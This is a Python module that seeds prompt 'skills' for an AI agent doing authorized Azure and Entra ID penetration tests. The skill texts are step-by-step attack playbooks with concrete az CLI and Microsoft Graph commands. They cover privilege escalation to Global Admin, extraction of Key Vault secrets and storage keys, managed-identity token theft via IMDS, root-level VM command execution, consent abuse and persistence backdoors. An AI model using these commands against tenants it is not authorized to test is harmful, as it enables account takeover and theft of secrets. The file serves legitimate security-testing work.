"""Azure / Entra ID cloud-pentest agent skills.

These specialize a scan for an authorized penetration test of a live Azure tenant. Each skill
teaches the tool-using agent the concrete `az` CLI and Microsoft Graph (`az rest`) commands for
one resource type or attack technique, so it can enumerate, extract secrets, and escalate toward
a chosen target identity from a real terminal — capturing every command and its output as
evidence for the PT report.

Same shape as samsung_skills.py: (selector, name, description, content); slug prefix `azure-`;
seeded insert-if-missing so UI edits survive. Attach the azure-* skills to an Azure Cloud
Pentest scan.

Scope: authorized engagements only, against a tenant the operator is permitted to test. The
operator authenticates (az login / device code); the agent inherits that session.
"""

from __future__ import annotations

import logging

LOGGER = logging.getLogger("open_kritt_engine")

_SLUG_PREFIX = "azure-"

_GRAPH = "az rest --url https://graph.microsoft.com/v1.0"

# (selector, name, description, content)
_AZURE_SKILLS: list[tuple[str, str, str, str]] = [
    (
        "cli-graph-recon",
        "az CLI + Microsoft Graph operating basics",
        "How to drive az CLI and Microsoft Graph from the terminal, establish the current identity, and capture evidence.",
        "You operate a LIVE authorized Azure engagement from a terminal. Establish context first: `az account show`, "
        "`az account list --output table`, `az ad signed-in-user show` (fails for a service principal login — then use "
        "`az account show --query user`). Call Microsoft Graph with `az rest --method GET --url "
        "https://graph.microsoft.com/v1.0/<path>` (use `--url https://graph.microsoft.com/beta/...` for beta objects, "
        "and `-o json`). Get tokens for a specific audience with `az account get-access-token --resource-type ms-graph` "
        "or `--resource https://management.azure.com/`. Prefer READ/enumeration commands; run a state-changing command "
        "only to prove a specific finding, and pick the least-invasive proof. Record EVERY command and its real, "
        "verbatim (trimmed) output into commands_run as {command, output} — never paraphrase or invent output. An "
        "'insufficient privileges'/403 is itself useful evidence of a boundary. Paginate Graph with @odata.nextLink.",
    ),
    (
        "entra-identities-roles",
        "Entra ID users, groups, directory roles & PIM",
        "Enumerate users/groups/roles and find over-privileged or attacker-controllable identities and role paths.",
        "Enumerate the Entra ID (Azure AD) identity plane. Users/groups: "
        f"`{_GRAPH}/users?$select=id,userPrincipalName,accountEnabled`, `{_GRAPH}/me/memberOf`, "
        f"`{_GRAPH}/groups?$select=id,displayName,securityEnabled,groupTypes`, and group members "
        f"`{_GRAPH}/groups/<id>/members`. Directory roles (who is admin): `{_GRAPH}/directoryRoles` then "
        f"`{_GRAPH}/directoryRoles/<id>/members`; role definitions via `{_GRAPH}/roleManagement/directory/roleDefinitions` "
        f"and active assignments `{_GRAPH}/roleManagement/directory/roleAssignments?$expand=principal`. PIM eligible "
        f"roles: `{_GRAPH}/roleManagement/directory/roleEligibilityScheduleInstances`. Look for: groups you (or a "
        "principal you control) can modify that are assigned a privileged role or used for RBAC; role-assignable groups; "
        "self-service group ownership; dynamic-membership rules an attacker can satisfy. Map each toward the target. "
        "Report the identity, the role/edge, and how a controlled principal reaches it.",
    ),
    (
        "applications-serviceprincipals",
        "App registrations & service principals",
        "App/SP credentials, ownership, and Graph API permissions that enable credential-add and consent privesc.",
        "Enumerate applications and service principals — the richest Azure privesc surface. "
        f"`{_GRAPH}/applications`, `{_GRAPH}/servicePrincipals`, ownership `{_GRAPH}/me/ownedObjects` and "
        f"`{_GRAPH}/applications/<id>/owners`. For each app/SP check: existing credentials "
        f"(`{_GRAPH}/applications/<id>` -> passwordCredentials/keyCredentials), and its Graph/API permissions "
        f"(app roles) via `{_GRAPH}/servicePrincipals/<id>/appRoleAssignments` and oauth2PermissionGrants. KEY ABUSES: "
        "if you own or can write an application, add a client secret (`az ad app credential reset --id <appId>` or "
        f"Graph `POST {_GRAPH.replace('/v1.0','/v1.0')}/applications/<id>/addPassword`) then log in as that SP "
        "(`az login --service-principal -u <appId> -p <secret> --tenant <tid>`) to inherit its privileges. Hunt SPs "
        "holding dangerous app roles (AppRoleAssignment.ReadWrite.All, RoleManagement.ReadWrite.Directory, "
        "Application.ReadWrite.All, Directory.ReadWrite.All, PrivilegedAccess.*) — controlling one is often a path to "
        "Global Admin. Report the app/SP, its perms/creds, the owner edge, and the concrete abuse.",
    ),
    (
        "graph-app-role-privesc",
        "Microsoft Graph app-role privilege escalation",
        "Escalate via dangerous Graph app roles: grant roles, add app credentials, self-assign directory roles.",
        "Escalate through Microsoft Graph app roles once you control a service principal. Dangerous roles and their "
        "abuse: Application.ReadWrite.All or AppRoleAssignment.ReadWrite.All -> add credentials to (or grant app roles "
        "to) a MORE privileged app/SP and authenticate as it; RoleManagement.ReadWrite.Directory -> assign a "
        "privileged directory role (e.g. Privileged Role Administrator, then Global Admin) to a principal you control "
        f"via `POST {_GRAPH}/roleManagement/directory/roleAssignments`; Directory.ReadWrite.All / Group.ReadWrite.All -> "
        "add your principal to a role-assignable or RBAC-linked group; User.ReadWrite.All -> reset/relay. Prove the "
        "escalation minimally: perform the grant, re-authenticate as the escalated identity, and confirm the new "
        "privilege with a read command. Record the exact grant command and the confirming read. Only escalate as far "
        "as the engagement target requires.",
    ),
    (
        "rbac-azure-resources",
        "Azure RBAC (ARM) roles & resource privesc",
        "Azure resource-manager role assignments: Owner/User Access Administrator abuse and role-to-data paths.",
        "Enumerate and abuse Azure Resource Manager RBAC (separate from Entra directory roles). Assignments: "
        "`az role assignment list --all -o json` and per-scope `az role assignment list --scope <id>`; definitions "
        "`az role definition list`. Find who holds Owner or User Access Administrator (can grant themselves any role), "
        "Contributor (can read most data planes, run commands on VMs, read app settings), Key Vault "
        "Administrator/Secrets User, Storage Blob Data roles, Automation Contributor. ABUSE: with Owner/UAA, "
        "`az role assignment create --assignee <you> --role Owner --scope <sub/rg/resource>` to reach a resource, then "
        "pivot to its data plane. Map each role to what data/credentials/compute it unlocks and whether it advances to "
        "the target. Report the assignment, scope, principal, and the concrete resource/secret it grants.",
    ),
    (
        "key-vault",
        "Azure Key Vault secret/key/cert extraction",
        "List and read Key Vault secrets, keys and certificates the current identity can access.",
        "Extract from Azure Key Vault. Enumerate vaults `az keyvault list -o table`; check access model (access "
        "policies vs RBAC) `az keyvault show --name <v>`. Read: `az keyvault secret list --vault-name <v>`, then "
        "`az keyvault secret show --vault-name <v> --name <s> --query value -o tsv` (the cleartext secret — capture in "
        "evidence, redact in summary). Also `az keyvault key list` and `az keyvault certificate list/show` (a "
        "downloadable PFX private key is high impact). Secrets here are usually connection strings, app credentials, or "
        "API keys that unlock databases, storage, or other principals — chase what each unlocks. If denied, the vault's "
        "RBAC/policy is the boundary; note the role you'd need. Report the vault, the secret name/kind, the exact "
        "command, and what the secret grants downstream.",
    ),
    (
        "storage-blobs",
        "Azure Storage: accounts, keys, SAS & public blobs",
        "Storage account keys, SAS tokens, and anonymously/over-permissively readable containers and blobs.",
        "Attack Azure Storage. Enumerate `az storage account list -o table`; check public access "
        "`az storage account show --name <a> --query allowBlobPublicAccess` and network rules. Keys/SAS (full data "
        "access): `az storage account keys list --account-name <a>` and `az storage account generate-sas ...`. "
        "Containers/blobs: `az storage container list --account-name <a> --auth-mode login` (or `--account-key`), "
        "`az storage blob list -c <c> --account-name <a>`, download `az storage blob download ...`. Test ANONYMOUS "
        "access to public containers over HTTPS (no auth) — a common exposure. Hunt inside blobs for secrets, "
        "connection strings, backups, terraform state, .env, disks/VHDs. A storage key or a leaked connection string "
        "is a durable credential — record what it unlocks. Report account, container/blob, access method, and evidence.",
    ),
    (
        "sharepoint-onedrive",
        "SharePoint & OneDrive via Microsoft Graph",
        "Enumerate and read SharePoint sites and OneDrive drives/files reachable by the current or escalated identity.",
        "Access SharePoint Online and OneDrive through Graph (needs Sites.Read.All/Files.Read.All or a user token with "
        f"access). Sites: `{_GRAPH}/sites?search=*`, `{_GRAPH}/sites/<siteId>/drives`, list items "
        f"`{_GRAPH}/drives/<driveId>/root/children` and search `{_GRAPH}/drives/<driveId>/root/search(q='password')`. "
        f"OneDrive: `{_GRAPH}/users/<id>/drive/root/children` or `{_GRAPH}/me/drive/root/children`; download an item's "
        "@microsoft.graph.downloadUrl. Hunt documents holding credentials, PII, network diagrams, key material, or "
        "onboarding docs. This proves data-access impact for a reached identity. Report the site/drive/file, the Graph "
        "call, and the sensitive content class found (redact specifics in summary, capture in evidence).",
    ),
    (
        "managed-identities",
        "Managed identities & token theft (IMDS)",
        "Abuse system/user-assigned managed identities on VMs, Automation, Functions to obtain tokens for stronger identities.",
        "Abuse managed identities (MIs). Find them: `az identity list -o table`, and per-resource `identity` blocks on "
        "VMs/Functions/Automation/Logic Apps (`az vm show ... --query identity`). If you can run code on a resource "
        "with an MI (VM run-command, Function, Automation runbook), steal its token from IMDS: on the VM run `curl -H "
        "'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://"
        "management.azure.com/'` (or resource=https://graph.microsoft.com/ / a Key Vault URL). Use the token with "
        "`az login --identity` on the resource, or `az rest`/ARM calls carrying the bearer token. A Contributor/Owner "
        "MI, or one with Key Vault or Graph access, is a pivot to stronger identities. Map the MI's role assignments "
        "first (see rbac-azure-resources) to know what its token unlocks. Report the MI, host, token audience obtained, "
        "and reach.",
    ),
    (
        "vm-compute",
        "Virtual machines & compute code execution",
        "Run commands on VMs (run-command / custom script) to execute code, read local secrets, and steal MI tokens.",
        "Get code execution on Azure compute. With VM Contributor / Virtual Machine Contributor or run-command rights: "
        "`az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts \"<cmd>\"` (Linux) or "
        "`RunPowerShellScript` (Windows) — this runs as root/SYSTEM and returns stdout. Use it to read local secrets, "
        "cloud-init/custom-data (`cat /var/lib/waagent/CustomData` base64), stored credentials, and to hit IMDS for the "
        "VM's managed-identity token (see managed-identities). Also review VM extensions (`az vm extension list`) and "
        "custom-script settings for embedded secrets, and disk snapshots you can read. VMSS: `az vmss run-command`. "
        "This proves code-exec + credential-theft impact. Record the exact run-command and its real output.",
    ),
    (
        "automation-runbooks",
        "Automation accounts, runbooks & hybrid workers",
        "Automation account variables/credentials/connections and runbook execution as a privileged Run-As/MI identity.",
        "Attack Azure Automation. Enumerate `az automation account list` (and the REST/ARM API for detail). Loot: "
        "automation VARIABLES (often secrets) and CREDENTIAL assets, connections (Run-As service-principal certs), and "
        "the account's managed identity. If you can create/edit/start a runbook, run code as the account's Run-As/MI "
        "identity (frequently Contributor+) to read secrets or pivot — a classic privesc. Hybrid Runbook Workers run "
        "on-prem/VMs and extend reach. Use ARM: `az rest --method GET --url "
        "'https://management.azure.com/subscriptions/<s>/resourceGroups/<rg>/providers/Microsoft.Automation/"
        "automationAccounts/<a>/variables?api-version=2023-11-01'`. Report the asset/runbook, the identity it runs as, "
        "and what executing it grants.",
    ),
    (
        "functions-appservice",
        "Functions, App Service & Logic Apps settings",
        "App settings, connection strings, deployment creds and Kudu/SCM secrets from Functions/Web Apps/Logic Apps.",
        "Loot Azure App Service / Functions / Logic Apps. App settings & connection strings (commonly hold DB creds, "
        "storage keys, API keys, other principals' secrets): `az functionapp config appsettings list -g <rg> -n <app>` "
        "and `az webapp config appsettings list ...`, connection strings `az webapp config connection-string list`. "
        "Publishing/deployment creds: `az webapp deployment list-publishing-credentials` (Kudu/SCM access -> read files, "
        "run commands via the SCM console). Function keys / host keys grant invocation. Logic Apps: read run history and "
        "connections (API connections may store OAuth tokens). The app's managed identity is a pivot (see "
        "managed-identities). Report the app, the setting/secret, the command, and what it unlocks.",
    ),
    (
        "consent-oauth-abuse",
        "OAuth consent, delegated grants & illicit consent",
        "Abuse admin/user consent and existing oauth2 permission grants to broaden a controlled app's access.",
        "Abuse the OAuth consent framework. Inspect existing delegated grants "
        f"`{_GRAPH}/oauth2PermissionGrants` and app role assignments to see what scopes principals already hold. If you "
        "control an app and can obtain consent (you're an admin, or a user can consent to low-privilege scopes), "
        "broaden its delegated permissions to read mail/files/directory. Check tenant consent policy "
        "(`az rest --url 'https://graph.microsoft.com/v1.0/policies/adminConsentRequestPolicy'` and authorization "
        "policy) — permissive user-consent settings enable illicit-consent phishing paths (report as a finding even if "
        "you don't execute the phish). Prove the access broadening with a Graph call that newly succeeds. Report the "
        "app, the scope gained, and the data it reaches.",
    ),
    (
        "bloodhound-pathfinding",
        "BloodHound / AzureHound attack-path analysis",
        "Use an uploaded AzureHound/BloodHound map to compute concrete edges/paths from the current identity to the target.",
        "If the workspace contains a BloodHound / AzureHound export (look for bloodhound/, azurehound.json, or a *.zip "
        "of JSON), USE IT to plan the shortest abuse path to the engagement target. These files list nodes (AZUser, "
        "AZApp, AZServicePrincipal, AZGroup, AZRole, AZSubscription, AZResourceGroup, AZKeyVault, AZVM...) and edges "
        "(AZOwns, AZAddSecret, AZAddOwner, AZMemberOf, AZHasRole, AZUserAccessAdministrator, AZGetSecrets, "
        "AZManagedIdentity, AZRunsAs, AZGlobalAdmin...). Parse the JSON with terminal tools (grep/jq/python) to find "
        "the current principal's outbound edges and the shortest chain of abusable edges that ends at the target node. "
        "Translate each edge into the concrete az/Graph command that realizes it (AZAddSecret -> add app credential; "
        "AZUserAccessAdministrator -> az role assignment create; AZGetSecrets -> keyvault secret show; AZOwns app -> "
        "reset credential). Output the ordered edge->command path as the plan the exploitation steps execute.",
    ),
    (
        "secret-extraction",
        "Cross-resource secret & credential hunting",
        "Systematic sweep for secrets across Key Vault, storage, app settings, automation, code, IaC and tokens.",
        "Run a systematic secret sweep across the tenant, because one leaked credential usually unlocks the next hop. "
        "Sources, in priority order: Key Vault secrets/certs; storage blobs (.env, terraform.tfstate, backups, config, "
        "disks); App Service/Function app settings & connection strings; Automation variables/credentials/Run-As certs; "
        "VM custom-data & run-command output; deployment/ARM template parameters (`az deployment ... list`); DevOps/CI "
        "variables if reachable; and tokens (`az account get-access-token` for each audience your identities can reach). "
        "For every secret found, record where it came from, what type it is, and — critically — what it unlocks "
        "(follow it: authenticate with it and re-enumerate). Keep raw secrets in evidence, redacted in the summary. "
        "This feeds both standalone findings and the escalation chain toward the target.",
    ),
    (
        "post-exploitation-persistence",
        "Post-exploitation, persistence & impact demonstration",
        "Demonstrate impact for the report and describe persistence primitives without leaving unauthorized backdoors.",
        "Once you reach the target (or a strong identity), demonstrate impact for the report with the least-invasive "
        "proof, and DESCRIBE (do not deploy, unless the engagement authorizes) persistence primitives. Impact: read a "
        "specific high-value secret/data the target controls, enumerate what the target identity can access, or show "
        "lateral movement to another subscription/tenant resource. Persistence primitives to document and prove "
        "FEASIBLE via a dry read (not by leaving them): adding a client secret or FEDERATED credential to a privileged "
        "app (workload-identity backdoor), a new app/SP with app roles, an Automation runbook, an additional Owner role "
        "assignment, or a guest/BEC-style mailbox rule. For anything state-changing you actually did to prove a finding "
        "(e.g. an added secret), NOTE it clearly so the operator can clean up. Record commands + outputs; summarize the "
        "business impact for the PT report.",
    ),
]


def azure_skill_defs() -> list[dict[str, str]]:
    return [
        {"slug": _SLUG_PREFIX + selector, "selector": selector, "name": name, "description": desc, "content": content}
        for (selector, name, desc, content) in _AZURE_SKILLS
    ]


def ensure_azure_skills(conn) -> int:
    """Seed the Azure cloud-pentest agent skills (insert-if-missing). Returns count added."""
    installed = 0
    for skill in azure_skill_defs():
        cur = conn.execute(
            """
            INSERT INTO public.agent_skills (slug, name, description, content)
            VALUES (%s, %s, %s, %s)
            ON CONFLICT (slug) DO NOTHING
            """,
            (skill["slug"], skill["name"], skill["description"], skill["content"]),
        )
        installed += cur.rowcount or 0
    conn.commit()
    return installed
